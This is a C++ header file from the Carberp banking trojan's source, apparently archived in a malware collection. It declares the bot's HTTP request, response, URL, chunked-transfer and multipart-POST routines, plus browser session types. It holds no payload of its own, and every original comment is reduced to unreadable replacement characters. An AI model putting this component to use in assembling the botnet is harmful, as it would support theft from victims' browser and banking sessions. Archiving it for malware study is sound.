/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------
//  ������ ����������� ������ � HTTP ����������
//
//  ������ 1.0
//  �������������: 12 ������ 2011
//---------------------------------------------------------------------------


//---------------------------------------------------------------------------


#ifndef BotHTTPH
#define BotHTTPH

#include <windows.h>

#include "Strings.h"
#include "BotClasses.h"

// �������� �������� ������� HTTP �������
const PCHAR HTTPMethodGET = "GET";
const PCHAR HTTPMethodPOST = "POST";
const PCHAR HTTPMethodHEAD = "HEAD";
const PCHAR HTTPMethodPUT = "PUT";
const PCHAR HTTPMethodDELETE = "DELETE";
const PCHAR HTTPMethodLINK = "LINK";
const PCHAR HTTPMethodUNLINK = "UNLINK";
const PCHAR HTTPMethodCONNECT = "CONNECT";
const PCHAR HTTPMethodOPTIONS = "OPTIONS";
const PCHAR HTTPMethodPATCH = "PATCH";
const PCHAR HTTPMethodTRACE = "TRACE";


// �������� ������ HTTP ���������
const PCHAR HTTPProtocolVersion_1_0 = "HTTP/1.0";
const PCHAR HTTPProtocolVersion_1_1 = "HTTP/1.1";

const PCHAR ProtocolHTTP  = "http";
const PCHAR ProtocolHTTPS = "https";

// �������� ��������� HTTP ����������
const PCHAR ParamHost = "Host";
const PCHAR ParamReferer = "Referer";
const PCHAR ParamAccept = "Accept";
const PCHAR ParamUserAgent = "User-Agent";
const PCHAR ParamAcceptLanguage = "Accept-Language";
const PCHAR ParamAcceptEncoding = "Accept-Encoding";
const PCHAR ParamContentType = "Content-Type";
const PCHAR ParamContentLength = "Content-Length";
const PCHAR ParamCookie = "Cookie";
const PCHAR ParamProxyConnection = "Proxy-Connection";
const PCHAR ParamRange = "Range";
const PCHAR ParamTransferEncoding = "Transfer-Encoding";
const PCHAR ParamConnection = "Connection";
const PCHAR ParamLocation = "Location";
const PCHAR ParamAcceptRanges = "Accept-Ranges";
const PCHAR ParamContentRange = "Content-Range";



// ����������� �����
const PCHAR LineBreak = "\r\n";
const PCHAR LineBreak2 = "\r\n\r\n";
const PCHAR ValueDelimeter = ": ";
const PCHAR ValueChunked = "chunked";
const PCHAR URLValueDelimeter = "&";

const PCHAR FormDataURLEncoded = "application/x-www-form-urlencoded";
const PCHAR FormDataMultiPart = "multipart/form-data; boundary=";

// ����������� �����
const WORD PortHTTP = 80;

// ������� �������� ����������
const PCHAR DefaultPath = "/";
const PCHAR DefaultAccept = "*/*";
const PCHAR DefaultAcceptLanguage = "ru";
const PCHAR DefaultConnection = "Close";

// ���� HTTP ��������
enum THTTPMethod {hmUnknown, hmGET, hmPOST, hmHEAD};

// ������ HTTP ���������
enum THTTPProtocol {HTTP_1_0, HTTP_1_1};

enum TPostDataType {pdtUrlEncoded, pdtMultipartFormData};

// �������� HTTP �������
typedef struct THTTPRequest
{
	THTTPMethod Method;         // ����� ��������
	PCHAR Host;                 // ��� �������������� �����
	PCHAR Path;                 // ���� � ���������
    WORD  Port;                 // ���� ��������� �������
	PCHAR Referer;              // ����� � �������� ��� ������
	PCHAR Accept;               // �������������� ���� ������
	PCHAR AcceptLanguage;       // �������������� ����
	PCHAR ProxyConnection;      // ��� ����������
	PCHAR UserAgent;            // ��� ������ ������� ������ ������
	PCHAR Cookie;               // ������������ ����
	PCHAR ContentType;          // ��� ������������ ������
	DWORD ContentLength;        // ����� ������������ ������
	LPVOID PostData;	     	// ������������ ������
    TPostDataType PostDataType; // ��� ���� ������
	PCHAR Connection;           // �������� ����������
	bool UseRange;              // ������������ �������� ��������
	DWORD StartRange;           // ��� ������� ������ - ��������� ����
	DWORD EndRange;             // �������� ���� �������
} *PHTTPRequest;


// �������� ������ HTTP �������
typedef struct THTTPResponse
{
    PCHAR Protocol;        // �������� ������
	DWORD Code;            // ��� ������ �������
    PCHAR ResponseLine;    // �������� ���� ������
	PCHAR ContentType;     // ��� ����������� ������
	DWORD ContentLength;   // ������ ����������� ������
	PCHAR AcceptRanges;    // ����� �� ���������� �������
    PCHAR Connection;      // ���������� � ����������
	PCHAR Location;        // ����� �������������
	DWORD StartRange;      // ������ ����� � �����
	DWORD EndRange;        // ����� ����� � �����
	DWORD FullSize;        // ������ ������ �����
} *PHTTPResponse;


// �������� URL ������
typedef struct TURL
{
    PCHAR Protocol;
	PCHAR Host;
	PCHAR Path;
	PCHAR Document;
	PCHAR Arguments;
	PCHAR UserName;
	PCHAR Password;
	WORD Port;
} *PURL;

//----------------------------------------------------------------------------
//  ������� ��� ������ � ���������
//----------------------------------------------------------------------------

// ������� ��������� �������
PHTTPRequest HTTPCreateRequest(PCHAR URL);

// ������� ��������� �������
void HTTPFreeRequest(PHTTPRequest Request);

// ������� ������� ��������� HTTP �������
void HTTPClearRequest(PHTTPRequest Request);

// ������� ��������� �� ��������� ���� ��������� ������� ������������ �������
void HTTPInitializeRequest(PHTTPRequest Request);

// ������� ��������� HTTP ������ � ���������
bool ParseHTTPRequest(PCHAR Buf, PHTTPRequest Request);

// ���������  ��������� ������� ������� �� ������
void HTTPSetRequestURL(PHTTPRequest Request, PCHAR URL);

namespace HTTPRequest
{

	// ������� �������� ������ �������
	PCHAR Build(PHTTPRequest Request);
};


//*****************************************************************************
//  HTTPResponse - ������� ��� ������ � �������� HTTP �������
//*****************************************************************************
namespace HTTPResponse
{
	//  Create - ������� ��������� ������
	PHTTPResponse Create();

	//  Clear - �������� ��������� ������
	void Clear(PHTTPResponse Response);

	//  Free - ���������� ��������� ������
	void Free(PHTTPResponse Response);

	//  Parse - ������� ����� �������
	bool Parse(PCHAR Buf, PHTTPResponse Response);
}


//*****************************************************************************
//  Chunks - ������ ��� ������ � ��������� ������ �������
//*****************************************************************************
typedef struct TChunks
{
	DWORD Size;      // ������ �����
	DWORD Readed;    // ������ ����������� ������
    bool Completed;  // ������� ����, ��� �������� ��������� ��������
} *PChunks;

namespace Chunks
{
	// ������� ��������� ��������� ������ � � ������ ����
	// ���� �������� ��������� Transfer-Encoding = chunked
	// ������ ��������� ��� ������ � ������������ �������
	PChunks Initialize(PCHAR HTTPResponse);

	// ������� ���������� ���������
	void Free(PChunks Chunks);

	//  ���������� ���� ������
	//  ����� ��������� ������ �������� Size ����� ��������
	void HandleDataBlock(PChunks Chunks, LPBYTE Data, DWORD &Size);

	// ������� �������� ������ ����� � ���������� ��������� �� ��� ������
	LPBYTE GetChunkSize(LPBYTE Buf, DWORD BufSize, DWORD &Size);
}


//----------------------------------------------------------------------------
//  �������������� ������� ��� ������ � HTTP
//----------------------------------------------------------------------------

PCHAR GetMethodStr(THTTPMethod Kind); // �������� ������ ������ �� ������
THTTPMethod GetMethodFromStr(PCHAR Method);

PCHAR URLEncode(PCHAR URL, DWORD URLSize = 0); // ���������� URL ������
void AddURLParam(PStrings S, PCHAR Name, PCHAR Value, DWORD ValueSize = 0); // �������� �������� � ��������� ���� � ������

bool ParseURL(PCHAR URL, PURL Rec, bool FullPars = false); // ���������� URL
void ClearURL(PURL URL);

bool ParseRequestFirstLine(PCHAR Line, PCHAR *Method, PCHAR *Path, PCHAR *ProtVersion);
PCHAR GetURLEncodedPostData(PCHAR Buf);

//*****************************************************************************
//  HTTPParser - ������ HTTP ������
//*****************************************************************************
namespace HTTPParser
{
	bool ParseResponseLine(PCHAR Buf, PCHAR &Protocol, DWORD &Code, PCHAR &StatusLine);

	// ������� ���������� �������� HTTP ���������
	PCHAR GetHeaderValue(PCHAR Buf, PCHAR Name);
}

//*****************************************************************************
// ������ ��� ������ � HTTP �������
//*****************************************************************************
namespace HTTPUtils
{
    PCHAR DeleteHeaderValue(PCHAR Buf, int &Size, PCHAR Header);
}

//***************************************************************************
//  MultiPartData - ������ ��� ������ � ���� ������� ������� a
//                  multy part form dat
//***************************************************************************


typedef struct TMultiPartData
{
	PList Items;
	PCHAR Boundary;

    DWORD ReadIndex;  // ������� ��������� ��������
} *PMultiPartData;


enum TMultiItemReadState {mprsUnknown, mprsHeader, mprsData, mprsBoundary, mprsCompleted};

typedef struct TMultiPartItem
{
	PCHAR Name;        // ��� ����
	PCHAR FileName;    // ��� �����
	LPVOID Data;       // ����� ������
	DWORD Size;        // ������ ������
	PCHAR ContentType; // ��� �������� �����

	// ��������� ���� ���������� ������ ��� ������ ������ � �����
	PCHAR Header;      // ��������� �������� (��� ��������)
	TMultiItemReadState ReadState; // ��������� ������ ��������
	DWORD ReadedSize;  // ������ ����������� ������
	HANDLE FileHandle; // ������������� ��������� �����
	PCHAR Boundary;    // �������� ������� ��������
} *PMultiPartItem;



namespace MultiPartData
{
	// ������� ��������� ������
	PMultiPartData Create();

	// ���������� ��������� ������
	void Free(PMultiPartData Data);

	// �������� �������� ������
	PMultiPartItem AddBlobField(PMultiPartData Data, PCHAR Name, LPBYTE Value, DWORD ValueSize);

	// �������� ��������� ����
	PMultiPartItem AddStringField(PMultiPartData Data, PCHAR Name, PCHAR Value);

	// �������� ����
	PMultiPartItem AddFileField(PMultiPartData Data, PCHAR Name, PCHAR FileName, PCHAR ContentType);

	// �������� �������� ������ ��� ����
	PMultiPartItem AddBlobAsFile(PMultiPartData Data, PCHAR Name, PCHAR FileName,
								 PCHAR ContentType, LPBYTE Value, DWORD ValueSize);


	// ������� ������ ��������� ���� ������.
	// ��������� - ���������� ����������� ����
	// ���������� - ���� �� ���� �������� ������� �����, ��
	// ������� ������ ����� ������ ���� ������
	DWORD Read(PMultiPartData Data, LPBYTE Buffer, DWORD BufferSize);

	// �������� ������ � ���� ������
	LPBYTE BuildToBuf(PMultiPartData Data, DWORD &ResultSize);
}


//*****************************************************************************
//  HTTP - ������ ���������� HTTP ��������
//*****************************************************************************

namespace HTTP
{
	// ��������� �������� ����������� ������
	typedef struct TResponseData
	{
		PCHAR *Buffer;   // ��������� �� ���������� ������ �����
		DWORD *Size;     // ��������� �� ���������� ������� �������� ������
		PCHAR *Headers;  // ��������� �� ���������� �������� ����������� ������ �������
        PHTTPResponse Response; // ��������� ������
	}*PResponseData;

	//********************************************************
	//  ExecuteMethod - ��������� HTTP ������ � �������
	//********************************************************
	bool ExecuteMethod(PHTTPRequest Request, HTTP::PResponseData Response);


	//********************************************************
	//  Get - ��������� GET ������
	//
	//  URL - ����� ����������� ��������
	//  Buf - ��������� �� ���������� ������. ���������� �����
	//		  ���������������� �� ����� ���������� �������
	//        ���� �� �������, �� ����� �� ����� ����������
	//		  ������ �������.
	//        ���������� �������� StrFree
	//
	//  ��������� - ������ ������ ���� ������� ���������
	//		������. ��� ������ �� �����������
	//********************************************************
	bool Get(PCHAR URL, PCHAR *Buf);


	//********************************************************
	//  Post - ��������� GET ������
	//
	//  URL - ����� ����������� ��������
	//
	//  Fields - POST ������ �������
	//
	//  Buf - ��������� �� ���������� ������. ���������� �����
	//		  ���������������� �� ����� ���������� �������
	//        ���� �� �������, �� ����� �� ����� ����������
	//		  ������ �������.
	//        ���������� �������� STR::Free
	//
	//  ��������� - ������ ������ ���� ������� ���������
	//		������. ��� ������ �� �����������
	//********************************************************
	bool Post(PCHAR URL, PStrings Fields, PCHAR *Buf);
    bool Post(PCHAR URL, PMultiPartData Fields, PCHAR *Buf);
}




//*****************************************************************************
//
//*****************************************************************************


// ���� ���������
#define BROWSER_TYPE_IE		1  // Internet Explorer
#define BROWSER_TYPE_FF		2  // Mozilla Firefox
#define BROWSER_TYPE_O		3  // Opera


// �������� ������ �������� HTML ���������
typedef struct THTTPSessionInfo{
	DWORD BrowserType;  // ��� ��������
	PCHAR UserAgent;    // ��� ��������
	PCHAR URL;          // ����� ������������ �������
} *PHTTPSessionInfo;




//---------------------------------------------------------------------------
#endif
